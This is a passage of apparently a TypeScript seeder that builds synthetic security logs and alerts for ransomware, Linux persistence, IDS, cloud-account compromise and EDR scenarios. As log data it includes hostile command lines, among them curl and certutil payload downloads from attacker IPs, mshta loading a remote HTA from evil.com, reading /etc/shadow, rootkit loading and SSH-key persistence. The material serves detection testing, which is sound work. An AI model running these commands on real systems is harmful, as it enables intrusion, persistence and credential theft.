        event: { action: "modification", category: ["file"], type: ["change"], kind: "event", dataset: "endpoint.events.file" },
        file: { name: `file_${i}.${["xlsx","docx","pdf","pptx","sql"][i%5]}.locked`, path: `C:\\Shares\\${["Finance","HR","Engineering","Legal"][i%4]}\\file_${i}.locked`, extension: "locked" },
        process: { entity_id: E.encryptor, name: "svchst.exe", pid: 6100 },
      },
    });
  }

  // Alerts with full ancestry for process tree
  const wsAnc = [E.ps, E.rundll32, E.cmd, E.winword, E.outlook, E.explorer];

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "Suspicious Macro-Enabled Document Execution",
    severity: "medium", riskScore: 55,
    reason: "WINWORD.EXE spawned cmd.exe on WKSTN-RECV01 — macro-based payload delivery",
    threat: [mitre("TA0001", "Initial Access", "T1566.001", "Spearphishing Attachment")],
    host: hosts[0], user: users[0],
    process: { entityId: E.cmd, parentEntityId: E.winword, ancestry: [E.winword, E.outlook, E.explorer], name: "cmd.exe", pid: 2200, executable: "C:\\Windows\\System32\\cmd.exe", parentName: "WINWORD.EXE", parentPid: 2100 },
  }));

  docs.push(alert(minutesAgo(count - 8), {
    ruleName: "Cobalt Strike Beacon - Periodic C2 Communication",
    severity: "high", riskScore: 82,
    reason: `rundll32.exe establishing periodic HTTPS connections to ${c2Ip} from WKSTN-RECV01`,
    threat: [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")],
    host: hosts[0], user: users[2],
    process: { entityId: E.rundll32, parentEntityId: E.cmd, ancestry: [E.cmd, E.winword, E.outlook, E.explorer], name: "rundll32.exe", pid: 3000, executable: "C:\\Windows\\System32\\rundll32.exe", parentName: "cmd.exe", parentPid: 2200 },
  }));

  docs.push(alert(minutesAgo(count - 12), {
    ruleName: "Enumeration of Domain Admin Group",
    severity: "medium", riskScore: 47,
    reason: "net.exe used to enumerate Domain Admins on WKSTN-RECV01 by svc_backup",
    threat: [mitre("TA0007", "Discovery", "T1069.002", "Domain Groups")],
    host: hosts[0], user: users[1],
    process: { entityId: E.netEnum, parentEntityId: E.ps, ancestry: wsAnc, name: "net.exe", pid: 4000, executable: "C:\\Windows\\System32\\net.exe", parentName: "powershell.exe", parentPid: 3500 },
  }));

  docs.push(alert(minutesAgo(15), {
    ruleName: "Credential Dumping - LSASS Access on Domain Controller",
    severity: "critical", riskScore: 95,
    reason: "Mimikatz accessed LSASS memory on SRV-DC01 — domain credential extraction",
    threat: [mitre("TA0006", "Credential Access", "T1003.001", "LSASS Memory")],
    host: hosts[2], user: users[2],
    process: { entityId: E.mimikatz, parentEntityId: "rw-dc-psexe-0002", ancestry: ["rw-dc-psexe-0002", "rw-dc-svc-0001"], name: "mimikatz.exe", pid: 5100, executable: "C:\\Windows\\Temp\\mimikatz.exe", parentName: "PSEXESVC.exe", parentPid: 5000 },
  }));

  docs.push(alert(minutesAgo(5), {
    ruleName: "Ransomware - Mass File Extension Modification",
    severity: "critical", riskScore: 99,
    reason: "Mass file encryption (.locked) detected on SRV-FILE01 — ransomware payload active",
    threat: [mitre("TA0040", "Impact", "T1486", "Data Encrypted for Impact")],
    host: hosts[1], user: users[2],
    process: { entityId: E.encryptor, parentEntityId: "rw-fs-psexe-0002", ancestry: ["rw-fs-psexe-0002", "rw-fs-svc-0001"], name: "svchst.exe", pid: 6100, executable: "C:\\ProgramData\\svchst.exe", parentName: "PSEXESVC.exe", parentPid: 6000 },
  }));

  docs.push(alert(minutesAgo(3), {
    ruleName: "Ransomware - Volume Shadow Copy Deletion",
    severity: "critical", riskScore: 97,
    reason: "vssadmin.exe deleting shadow copies on SRV-FILE01 — backup destruction",
    threat: [mitre("TA0040", "Impact", "T1490", "Inhibit System Recovery")],
    host: hosts[1], user: users[2],
    process: { entityId: E.vssadmin, parentEntityId: "rw-fs-psexe-0002", ancestry: ["rw-fs-psexe-0002", "rw-fs-svc-0001"], name: "vssadmin.exe", pid: 6200, executable: "C:\\Windows\\System32\\vssadmin.exe", parentName: "PSEXESVC.exe", parentPid: 6000 },
  }));

  docs.push(alert(minutesAgo(1), {
    ruleName: "Lateral Movement via PsExec to Multiple Hosts",
    severity: "high", riskScore: 85,
    reason: "PsExec-style remote execution detected from WKSTN-RECV01 to 3 servers",
    threat: [mitre("TA0008", "Lateral Movement", "T1570", "Lateral Tool Transfer")],
    host: hosts[0], user: users[1],
    process: { entityId: E.psexec, parentEntityId: E.ps, ancestry: wsAnc, name: "PsExec.exe", pid: 4300, executable: "C:\\Tools\\PsExec.exe", parentName: "powershell.exe", parentPid: 3500 },
  }));

  return docs;
}

// --- Linux Persistence (auditd) ---

function generateLinuxPersistence(count: number): IndexedDoc[] {
  const hosts = [
    { name: "web-prod-01", os: { name: "Ubuntu 22.04", platform: "linux", kernel: "5.15.0-89-generic" } },
    { name: "db-prod-02", os: { name: "RHEL 9.3", platform: "linux", kernel: "5.14.0-362.el9.x86_64" } },
  ];
  const docs: IndexedDoc[] = [];
  const attackerIp = randomIp();

  const auditActions = [
    { action: "executed", record_type: "SYSCALL", proc: { name: "bash", exe: "/usr/bin/bash", args: ["-i"] }, syscall: "execve" },
    { action: "executed", record_type: "EXECVE", proc: { name: "curl", exe: "/usr/bin/curl", args: ["-s", `http://${attackerIp}/shell.sh`, "-o", "/tmp/.cache"] }, syscall: "execve" },
    { action: "executed", record_type: "EXECVE", proc: { name: "chmod", exe: "/usr/bin/chmod", args: ["+x", "/tmp/.cache"] }, syscall: "fchmodat" },
    { action: "opened-file", record_type: "SYSCALL", proc: { name: "bash", exe: "/usr/bin/bash", args: ["-c", "cat /etc/shadow"] }, syscall: "openat" },
    { action: "executed", record_type: "EXECVE", proc: { name: "crontab", exe: "/usr/bin/crontab", args: ["-l"] }, syscall: "execve" },
    { action: "changed-file", record_type: "SYSCALL", proc: { name: "tee", exe: "/usr/bin/tee", args: ["-a", "/var/spool/cron/crontabs/root"] }, syscall: "openat" },
    { action: "changed-file", record_type: "PATH", proc: { name: "bash", exe: "/usr/bin/bash", args: ["-c", "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"] }, syscall: "openat" },
    { action: "executed", record_type: "EXECVE", proc: { name: "systemctl", exe: "/usr/bin/systemctl", args: ["enable", "update-helper.service"] }, syscall: "execve" },
    { action: "loaded-kernel-module", record_type: "SYSCALL", proc: { name: "insmod", exe: "/usr/sbin/insmod", args: ["/tmp/rootkit.ko"] }, syscall: "init_module" },
    { action: "changed-file", record_type: "PATH", proc: { name: "sed", exe: "/usr/bin/sed", args: ["-i", "s/PermitRootLogin no/PermitRootLogin yes/", "/etc/ssh/sshd_config"] }, syscall: "rename" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const host = hosts[i % hosts.length];
    const step = auditActions[i % auditActions.length];
    docs.push({
      _index: "logs-auditd.log-default",
      _source: {
        ...baseEvent(ts), host,
        event: { action: step.action, category: ["process"], kind: "event", dataset: "auditd.log", module: "auditd", outcome: "success" },
        user: { name: "root", id: "0", audit: { id: "0" } },
        process: { name: step.proc.name, pid: 10000 + i, executable: step.proc.exe, args: step.proc.args, parent: { pid: 1, name: "systemd" } },
        auditd: { log: { record_type: step.record_type, sequence: 8000 + i, syscall: step.syscall } },
      },
    });
  }

  docs.push(alert(minutesAgo(18), {
    ruleName: "Suspicious Download via Curl to Hidden File", dataset: "auditd.log",
    severity: "medium", riskScore: 52,
    reason: `curl downloaded remote payload to /tmp/.cache on web-prod-01 from ${attackerIp}`,
    threat: [mitre("TA0001", "Initial Access", "T1105", "Ingress Tool Transfer")],
    extra: { host: hosts[0], user: { name: "root" }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(14), {
    ruleName: "Crontab Persistence - Root Cron Modified", dataset: "auditd.log",
    severity: "high", riskScore: 78,
    reason: "Root crontab modified on web-prod-01 — cron-based persistence mechanism",
    threat: [mitre("TA0003", "Persistence", "T1053.003", "Cron")],
    extra: { host: hosts[0], user: { name: "root" }, process: { name: "tee", executable: "/usr/bin/tee" } },
  }));

  docs.push(alert(minutesAgo(10), {
    ruleName: "SSH Authorized Keys Modified", dataset: "auditd.log",
    severity: "high", riskScore: 82,
    reason: "New SSH public key added to /root/.ssh/authorized_keys on web-prod-01",
    threat: [mitre("TA0003", "Persistence", "T1098.004", "SSH Authorized Keys")],
    extra: { host: hosts[0], user: { name: "root" } },
  }));

  docs.push(alert(minutesAgo(7), {
    ruleName: "Systemd Service Created for Persistence", dataset: "auditd.log",
    severity: "high", riskScore: 75,
    reason: "Suspicious systemd service 'update-helper.service' enabled on db-prod-02",
    threat: [mitre("TA0003", "Persistence", "T1543.002", "Systemd Service")],
    extra: { host: hosts[1], user: { name: "root" }, process: { name: "systemctl", executable: "/usr/bin/systemctl" } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "Kernel Module Loaded - Potential Rootkit", dataset: "auditd.log",
    severity: "critical", riskScore: 95,
    reason: "Suspicious kernel module loaded from /tmp/rootkit.ko on web-prod-01 via insmod",
    threat: [mitre("TA0005", "Defense Evasion", "T1014", "Rootkit")],
    extra: { host: hosts[0], user: { name: "root" }, process: { name: "insmod", executable: "/usr/sbin/insmod" } },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "SSHD Config Modified to Allow Root Login", dataset: "auditd.log",
    severity: "high", riskScore: 72,
    reason: "PermitRootLogin changed to 'yes' in /etc/ssh/sshd_config on db-prod-02",
    threat: [mitre("TA0003", "Persistence", "T1021.004", "SSH")],
    extra: { host: hosts[1], user: { name: "root" } },
  }));

  return docs;
}

// --- Network IDS Threats (Suricata) ---

function generateNetworkIdsThreats(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const internalIp = "10.0.5.22";
  const c2Server = randomIp();
  const scannerIp = randomIp();
  const dnsExfilDomain = "data.x7k2.evil-cdn.com";
  const observer = { type: "ids", product: "suricata", version: "7.0.3" };

  const eventTypes = [
    { type: "dns", proto: "udp", dport: 53 },
    { type: "dns", proto: "udp", dport: 53 },
    { type: "http", proto: "tcp", dport: 80 },
    { type: "tls", proto: "tcp", dport: 443 },
    { type: "flow", proto: "tcp", dport: 443 },
    { type: "alert", proto: "tcp", dport: 443 },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const evt = eventTypes[i % eventTypes.length];
    const src: Record<string, unknown> = { ...baseEvent(ts), observer, event: { dataset: "suricata.eve", module: "suricata", kind: "event", category: ["network"] }, network: { transport: evt.proto, protocol: evt.type, community_id: `1:${crypto.randomUUID().substring(0, 8)}` }, source: { ip: internalIp, port: 49152 + i }, destination: { ip: i % 3 === 0 ? c2Server : randomIp(), port: evt.dport } };

    if (evt.type === "dns") {
      const subdomain = i % 4 === 0 ? `${crypto.randomUUID().substring(0, 16)}.${dnsExfilDomain}` : ["google.com", "microsoft.com", "github.com", "elastic.co"][i % 4];
      Object.assign(src, { dns: { question: { name: subdomain, type: "A" }, response_code: "NOERROR", type: "query" }, suricata: { eve: { event_type: "dns" } } });
    } else if (evt.type === "tls") {
      Object.assign(src, { tls: { version: "1.3", client: { ja3: "a0e9f5d64349fb13191bc781f81f42e1", server_name: i % 2 === 0 ? "cdn-update.cloudfront.com" : "api.microsoft.com" }, server: { ja3s: "b32309a26951912be7dba376398abc3b" } }, suricata: { eve: { event_type: "tls" } } });
    } else if (evt.type === "http") {
      Object.assign(src, { http: { request: { method: "POST", body: { bytes: 4096 + i * 100 } }, response: { status_code: 200 } }, url: { full: `http://${c2Server}/api/beacon`, domain: c2Server, path: "/api/beacon" }, suricata: { eve: { event_type: "http" } } });
    } else if (evt.type === "alert") {
      Object.assign(src, { suricata: { eve: { event_type: "alert", alert: { signature: "ET MALWARE Cobalt Strike Beacon Activity", signature_id: 2028765, gid: 1, rev: 3, category: "A Network Trojan was detected" } } }, rule: { id: "2028765", name: "ET MALWARE Cobalt Strike Beacon Activity", category: "Malware" } });
      Object.assign(src, { event: { dataset: "suricata.eve", module: "suricata", kind: "alert", category: ["network"], severity: 1 } });
    }

    docs.push({ _index: "logs-suricata.eve-default", _source: src });
  }

  // Port scan events
  for (let port of [22, 80, 443, 3389, 5432, 8080, 8443, 9200]) {
    docs.push({
      _index: "logs-suricata.eve-default",
      _source: { ...baseEvent(minutesAgo(count + 5)), observer, event: { dataset: "suricata.eve", kind: "event", category: ["network"] }, network: { transport: "tcp", protocol: "tcp" }, source: { ip: scannerIp, port: 44000 + port }, destination: { ip: internalIp, port }, suricata: { eve: { event_type: "flow" } } },
    });
  }

  docs.push(alert(minutesAgo(20), {
    ruleName: "DNS Tunneling - High Volume Subdomain Queries", dataset: "suricata.eve",
    severity: "high", riskScore: 78,
    reason: `Excessive unique subdomain queries to ${dnsExfilDomain} from ${internalIp} — DNS data exfiltration`,
    threat: [mitre("TA0010", "Exfiltration", "T1048.001", "Exfiltration Over Symmetric Encrypted Non-C2 Protocol")],
    extra: { source: { ip: internalIp }, dns: { question: { name: dnsExfilDomain } } },
  }));

  docs.push(alert(minutesAgo(15), {
    ruleName: "Suricata IDS - Cobalt Strike Beacon Detected", dataset: "suricata.eve",
    severity: "critical", riskScore: 92,
    reason: `Network IDS detected Cobalt Strike beacon traffic from ${internalIp} to ${c2Server}:443`,
    threat: [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")],
    extra: { source: { ip: internalIp }, destination: { ip: c2Server, port: 443 }, rule: { name: "ET MALWARE Cobalt Strike Beacon Activity" } },
  }));

  docs.push(alert(minutesAgo(10), {
    ruleName: "Suspicious TLS JA3 Fingerprint - Known C2 Framework", dataset: "suricata.eve",
    severity: "high", riskScore: 80,
    reason: `TLS connection from ${internalIp} using JA3 hash associated with Cobalt Strike`,
    threat: [mitre("TA0011", "Command and Control", "T1573.002", "Asymmetric Cryptography")],
    extra: { source: { ip: internalIp }, destination: { ip: c2Server }, tls: { client: { ja3: "a0e9f5d64349fb13191bc781f81f42e1" } } },
  }));

  docs.push(alert(minutesAgo(count + 3), {
    ruleName: "Network Port Scan Detected", dataset: "suricata.eve",
    severity: "medium", riskScore: 47,
    reason: `Port scan detected from ${scannerIp} targeting ${internalIp} across 8 ports`,
    threat: [mitre("TA0043", "Reconnaissance", "T1046", "Network Service Discovery")],
    extra: { source: { ip: scannerIp }, destination: { ip: internalIp } },
  }));

  docs.push(alert(minutesAgo(5), {
    ruleName: "HTTP C2 Beacon - Periodic POST Requests", dataset: "suricata.eve",
    severity: "high", riskScore: 76,
    reason: `Periodic HTTP POST beaconing from ${internalIp} to ${c2Server}/api/beacon`,
    threat: [mitre("TA0011", "Command and Control", "T1071.001", "Web Protocols")],
    extra: { source: { ip: internalIp }, destination: { ip: c2Server, port: 80 }, url: { domain: c2Server } },
  }));

  return docs;
}

// --- Entra ID / Azure AD Compromise ---

function generateEntraIdCompromise(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const cloud = { provider: "azure" };
  const tenantId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
  const legitimateIp = "203.0.113.10";
  const attackerIp = randomIp();
  const vpnIp = randomIp();

  const users = [
    { id: "u-001", name: "sarah.chen@contoso.com", full_name: "Sarah Chen" },
    { id: "u-002", name: "global.admin@contoso.com", full_name: "Global Admin" },
    { id: "u-003", name: "mike.dev@contoso.com", full_name: "Mike Dev" },
  ];

  const signInActions = [
    { outcome: "success", risk: "none", ip: legitimateIp, city: "San Francisco", country: "US", ca_status: "success", mfa: true },
    { outcome: "failure", risk: "low", ip: attackerIp, city: "Lagos", country: "NG", ca_status: "failure", mfa: false },
    { outcome: "failure", risk: "medium", ip: attackerIp, city: "Lagos", country: "NG", ca_status: "failure", mfa: false },
    { outcome: "success", risk: "high", ip: attackerIp, city: "Lagos", country: "NG", ca_status: "notApplied", mfa: true },
    { outcome: "success", risk: "none", ip: vpnIp, city: "London", country: "GB", ca_status: "success", mfa: true },
    { outcome: "success", risk: "high", ip: attackerIp, city: "Lagos", country: "NG", ca_status: "notApplied", mfa: false },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const user = users[i % users.length];
    const action = signInActions[i % signInActions.length];

    docs.push({
      _index: "logs-azure.signinlogs-default",
      _source: {
        ...baseEvent(ts), cloud,
        event: { action: "Sign-in activity", category: ["authentication"], kind: "event", outcome: action.outcome, dataset: "azure.signinlogs", module: "azure" },
        user: { id: user.id, name: user.name, full_name: user.full_name, email: user.name },
        source: { ip: action.ip, geo: { city_name: action.city, country_iso_code: action.country } },
        azure: {
          tenant_id: tenantId, correlation_id: crypto.randomUUID(),
          signinlogs: { properties: {
            conditional_access_status: action.ca_status,
            risk_level_aggregated: action.risk, risk_level_during_signin: action.risk, risk_state: action.risk === "none" ? "none" : "atRisk",
            authentication_requirement: action.mfa ? "multiFactorAuthentication" : "singleFactorAuthentication",
            device_detail: { browser: "Chrome 120.0", operating_system: "Windows 10", trust_type: action.ip === legitimateIp ? "AzureAd" : "unknown" },
            app_display_name: i % 3 === 0 ? "Microsoft 365" : i % 3 === 1 ? "Azure Portal" : "Microsoft Graph",
          } },
        },
      },
    });
  }

  const auditActions = [
    { action: "Add member to role", target: "Global Administrator", initiator: users[0].name },
    { action: "Add application", target: "ShadowApp-Exfil", initiator: users[0].name },
    { action: "Consent to application", target: "ShadowApp-Exfil", initiator: users[2].name },
    { action: "Update user", target: users[1].name, initiator: users[0].name },
    { action: "Add OAuth2PermissionGrant", target: "Mail.Read, Files.ReadWrite.All", initiator: users[0].name },
  ];
  for (let i = 0; i < Math.min(count, auditActions.length); i++) {
    const ts = minutesAgo(count - Math.floor(count / 2) - i);
    const a = auditActions[i];
    docs.push({
      _index: "logs-azure.auditlogs-default",
      _source: {
        ...baseEvent(ts), cloud,
        event: { action: a.action, category: ["iam"], kind: "event", outcome: "success", dataset: "azure.auditlogs", module: "azure" },
        user: { name: a.initiator },
        azure: { tenant_id: tenantId, auditlogs: { properties: { activity_display_name: a.action, operation_type: "Add", category: "RoleManagement", initiated_by: { user: { userPrincipalName: a.initiator } }, target_resources: [{ displayName: a.target, type: "User" }] } } },
      },
    });
  }

  docs.push(alert(minutesAgo(22), {
    ruleName: "Impossible Travel - Azure AD Sign-In", dataset: "azure.signinlogs",
    severity: "high", riskScore: 78,
    reason: `${users[0].name} signed in from San Francisco then Lagos within 15 minutes — physically impossible`,
    threat: [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")],
    extra: { user: { name: users[0].name }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(18), {
    ruleName: "Azure AD Risky Sign-In - High Risk", dataset: "azure.signinlogs",
    severity: "high", riskScore: 82,
    reason: `High-risk sign-in for ${users[0].name} from ${attackerIp} (Lagos, NG) — conditional access bypassed`,
    threat: [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")],
    extra: { user: { name: users[0].name }, source: { ip: attackerIp, geo: { country_iso_code: "NG" } } },
  }));

  docs.push(alert(minutesAgo(12), {
    ruleName: "Azure AD Global Administrator Role Assigned", dataset: "azure.auditlogs",
    severity: "critical", riskScore: 95,
    reason: `${users[0].name} granted Global Administrator role from suspicious session`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1098.003", "Additional Cloud Roles")],
    extra: { user: { name: users[0].name }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "OAuth App Consent Phishing - Excessive Permissions", dataset: "azure.auditlogs",
    severity: "critical", riskScore: 90,
    reason: `Application 'ShadowApp-Exfil' granted Mail.Read and Files.ReadWrite.All permissions`,
    threat: [mitre("TA0001", "Initial Access", "T1566.002", "Spearphishing Link")],
    extra: { user: { name: users[2].name } },
  }));

  docs.push(alert(minutesAgo(3), {
    ruleName: "Azure AD MFA Disabled for User", dataset: "azure.auditlogs",
    severity: "high", riskScore: 75,
    reason: `MFA requirement removed for ${users[1].name} by compromised admin session`,
    threat: [mitre("TA0005", "Defense Evasion", "T1556.006", "Multi-Factor Authentication")],
    extra: { user: { name: users[1].name } },
  }));

  return docs;
}

// --- Google Workspace Data Exfiltration ---

function generateGWorkspaceExfiltration(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const legitimateIp = "203.0.113.50";
  const attackerIp = randomIp();
  const orgId = "C04xyz123";

  const users = [
    { email: "ceo@acmecorp.com", name: "Pat Morgan" },
    { email: "finance.lead@acmecorp.com", name: "Jordan Lee" },
    { email: "ext.contractor@acmecorp.com", name: "Alex Temp" },
  ];

  const perType = Math.ceil(count / 3);

  // Login events
  for (let i = 0; i < perType; i++) {
    const ts = minutesAgo(count - i);
    const user = users[i % users.length];
    const suspicious = i % 4 === 0;
    const ip = suspicious ? attackerIp : legitimateIp;
    docs.push({
      _index: "logs-google_workspace.login-default",
      _source: {
        ...baseEvent(ts),
        event: { action: "login_success", category: ["authentication"], kind: "event", outcome: "success", dataset: "google_workspace.login", provider: "login" },
        user: { name: user.name, email: user.email, domain: "acmecorp.com" },
        source: { ip, user: { email: user.email } },
        organization: { id: orgId },
        google_workspace: { login: { challenge_method: suspicious ? "none" : "totp", is_suspicious: suspicious, type: "exchange" } },
      },
    });
  }

  // Admin events
  const adminActions = [
    { action: "GRANT_ADMIN_PRIVILEGE", setting: "Super Admin", target: users[2].email },
    { action: "CHANGE_APPLICATION_SETTING", setting: "Drive Sharing: External Sharing Enabled", target: "Drive" },
    { action: "ADD_RECOVERY_EMAIL", setting: "Recovery email added", target: users[0].email },
    { action: "CHANGE_TWO_STEP_VERIFICATION", setting: "2FA disabled for user", target: users[1].email },
  ];
  for (let i = 0; i < Math.min(perType, adminActions.length * 2); i++) {
    const ts = minutesAgo(count - perType - i);
    const a = adminActions[i % adminActions.length];
    docs.push({
      _index: "logs-google_workspace.admin-default",
      _source: {
        ...baseEvent(ts),
        event: { action: a.action, category: ["iam", "configuration"], kind: "event", outcome: "success", dataset: "google_workspace.admin", provider: "admin" },
        user: { name: users[0].name, email: users[0].email, domain: "acmecorp.com" },
        source: { ip: attackerIp, user: { email: users[0].email } },
        organization: { id: orgId },
        google_workspace: { admin: { setting: { name: a.setting }, new_value: "true", application: { name: a.target } } },
      },
    });
  }

  // Drive events — bulk download/sharing
  const driveFiles = [
    "FY2026_Revenue_Forecast.xlsx", "Board_Meeting_Minutes_Q1.docx", "Employee_Compensation.xlsx",
    "M&A_Target_Analysis.pdf", "Customer_Database_Export.csv", "Patent_Filing_Draft.docx",
    "Source_Code_Archive.zip", "API_Keys_and_Secrets.txt", "Investor_Presentation.pptx",
  ];
  for (let i = 0; i < Math.max(perType, driveFiles.length); i++) {
    const ts = minutesAgo(count - 2 * perType - i);
    const fileName = driveFiles[i % driveFiles.length];
    const actions = ["download", "download", "change_user_access", "move"];
    const action = actions[i % actions.length];
    docs.push({
      _index: "logs-google_workspace.drive-default",
      _source: {
        ...baseEvent(ts),
        event: { action, category: ["file"], kind: "event", outcome: "success", dataset: "google_workspace.drive", provider: "drive" },
        user: { name: users[2].name, email: users[2].email, domain: "acmecorp.com" },
        source: { ip: attackerIp, user: { email: users[2].email } },
        file: { name: fileName, owner: users[1].email, type: "document" },
        organization: { id: orgId },
        google_workspace: { drive: { file: { id: `file_${i}`, type: "document", owner: { email: users[1].email } }, visibility: action === "change_user_access" ? "shared_externally" : "private", target_user: action === "change_user_access" ? "personal-gmail@gmail.com" : undefined } },
      },
    });
  }

  docs.push(alert(minutesAgo(count - 2), {
    ruleName: "Google Workspace - Suspicious Login Without MFA", dataset: "google_workspace.login",
    severity: "medium", riskScore: 55,
    reason: `Suspicious login to ${users[0].email} from ${attackerIp} without MFA challenge`,
    threat: [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")],
    extra: { user: { name: users[0].name, email: users[0].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(count - perType - 1), {
    ruleName: "Google Workspace - Super Admin Granted to External Contractor", dataset: "google_workspace.admin",
    severity: "critical", riskScore: 92,
    reason: `Super Admin privilege granted to ${users[2].email} by compromised CEO account`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")],
    extra: { user: { name: users[0].name, email: users[0].email } },
  }));

  docs.push(alert(minutesAgo(count - perType - 3), {
    ruleName: "Google Workspace - External Drive Sharing Enabled Org-Wide", dataset: "google_workspace.admin",
    severity: "high", riskScore: 70,
    reason: "Organization-wide Drive external sharing setting changed to enabled",
    threat: [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")],
    extra: { user: { name: users[0].name, email: users[0].email } },
  }));

  docs.push(alert(minutesAgo(8), {
    ruleName: "Google Workspace - Bulk File Download by External User", dataset: "google_workspace.drive",
    severity: "high", riskScore: 82,
    reason: `${users[2].email} downloaded ${driveFiles.length} sensitive files in rapid succession`,
    threat: [mitre("TA0009", "Collection", "T1530", "Data from Cloud Storage")],
    extra: { user: { name: users[2].name, email: users[2].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(5), {
    ruleName: "Google Drive - Sensitive Files Shared to Personal Email", dataset: "google_workspace.drive",
    severity: "critical", riskScore: 94,
    reason: "Financial and M&A documents shared externally to personal-gmail@gmail.com",
    threat: [mitre("TA0010", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage")],
    extra: { user: { name: users[2].name, email: users[2].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "Google Workspace - 2FA Disabled for Finance User", dataset: "google_workspace.admin",
    severity: "high", riskScore: 75,
    reason: `Two-step verification disabled for ${users[1].email} by compromised admin`,
    threat: [mitre("TA0005", "Defense Evasion", "T1556.006", "Multi-Factor Authentication")],
    extra: { user: { name: users[1].name, email: users[1].email } },
  }));

  return docs;
}

// --- CrowdStrike EDR Attack (3rd-party endpoint) ---

function generateCrowdstrikeEdrAttack(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const csHost = getCrowdstrikeHost();
  const host = { ...csHost, name: csHost.name === "LAPTOP-FIN03" ? "LAPTOP-SALES04" : csHost.name, hostname: csHost.hostname === "LAPTOP-FIN03" ? "LAPTOP-SALES04" : csHost.hostname };
  const user = { name: "t.wilson", domain: "SALES" };
  const c2Ip = randomIp();

  const processChain = [
    { eid: "cs-explorer-001", parentEid: "", name: "explorer.exe", exe: "C:\\Windows\\explorer.exe", args: [], pid: 4000 },
    { eid: "cs-chrome-002", parentEid: "cs-explorer-001", name: "chrome.exe", exe: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", args: ["--type=renderer"], pid: 5100 },
    { eid: "cs-mshta-003", parentEid: "cs-chrome-002", name: "mshta.exe", exe: "C:\\Windows\\System32\\mshta.exe", args: ["http://evil.com/stage1.hta"], pid: 5200 },
    { eid: "cs-ps-004", parentEid: "cs-mshta-003", name: "powershell.exe", exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: ["-NoP", "-W", "Hidden", "-enc", "SQBFAFgA"], pid: 5300 },
    { eid: "cs-rundll-005", parentEid: "cs-ps-004", name: "rundll32.exe", exe: "C:\\Windows\\System32\\rundll32.exe", args: ["shell32.dll,ShellExec_RunDLL", "C:\\ProgramData\\update.dll"], pid: 5400 },
    { eid: "cs-net-006", parentEid: "cs-ps-004", name: "net.exe", exe: "C:\\Windows\\System32\\net.exe", args: ["user", "/domain"], pid: 5500 },
    { eid: "cs-nltest-007", parentEid: "cs-ps-004", name: "nltest.exe", exe: "C:\\Windows\\System32\\nltest.exe", args: ["/dclist:sales.corp.local"], pid: 5600 },
    { eid: "cs-certutil-008", parentEid: "cs-ps-004", name: "certutil.exe", exe: "C:\\Windows\\System32\\certutil.exe", args: ["-urlcache", "-split", "-f", `http://${c2Ip}/beacon.exe`, "C:\\ProgramData\\svchost.exe"], pid: 5700 },
    { eid: "cs-beacon-009", parentEid: "cs-ps-004", name: "svchost.exe", exe: "C:\\ProgramData\\svchost.exe", args: [], pid: 5800 },
    { eid: "cs-wmi-010", parentEid: "cs-beacon-009", name: "wmic.exe", exe: "C:\\Windows\\System32\\wbem\\wmic.exe", args: ["process", "call", "create", "C:\\ProgramData\\svchost.exe"], pid: 5900 },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const p = processChain[i % processChain.length];
    const parent = processChain.find((pp) => pp.eid === p.parentEid);

    docs.push({
      _index: "logs-crowdstrike.fdr-default",
      _source: {
        ...baseEvent(ts),
        agent: { type: "filebeat", id: AGENT_ID },
        event: { action: "ProcessRollup2", category: ["process"], type: ["start"], kind: "event", dataset: "crowdstrike.fdr", module: "crowdstrike" },
        host, user,
        process: {
          entity_id: i < processChain.length ? p.eid : entityId("cs-proc", i),
          parent: { entity_id: p.parentEid || undefined, name: parent?.name, pid: parent?.pid },
          name: p.name, pid: p.pid, executable: p.exe,
          args: p.args, command_line: [p.exe, ...p.args].join(" "),
        },
        crowdstrike: { event: { OperationName: "ProcessRollup2" } },
      },
    });

    // Network events for C2 phases
    if (p.name === "rundll32.exe" || p.name === "svchost.exe") {
      docs.push({
        _index: "logs-crowdstrike.fdr-default",
        _source: {
          ...baseEvent(ts),
          agent: { type: "filebeat", id: AGENT_ID },
          event: { action: "NetworkConnectIP4", category: ["network"], type: ["connection"], kind: "event", dataset: "crowdstrike.fdr" },
          host, user,
          source: { ip: "10.0.2.44", port: 49000 + i },
          destination: { ip: c2Ip, port: 443 },
          process: { entity_id: p.eid, name: p.name, pid: p.pid },
          network: { transport: "tcp", protocol: "tls" },
        },
      });
    }
  }

  docs.push(alert(minutesAgo(count - 3), {
    ruleName: "CrowdStrike - MSHTA Spawned by Browser", dataset: "crowdstrike.fdr",
    severity: "high", riskScore: 78,
    reason: "chrome.exe spawned mshta.exe loading remote HTA — drive-by download",
    threat: [mitre("TA0002", "Execution", "T1218.005", "Mshta")],
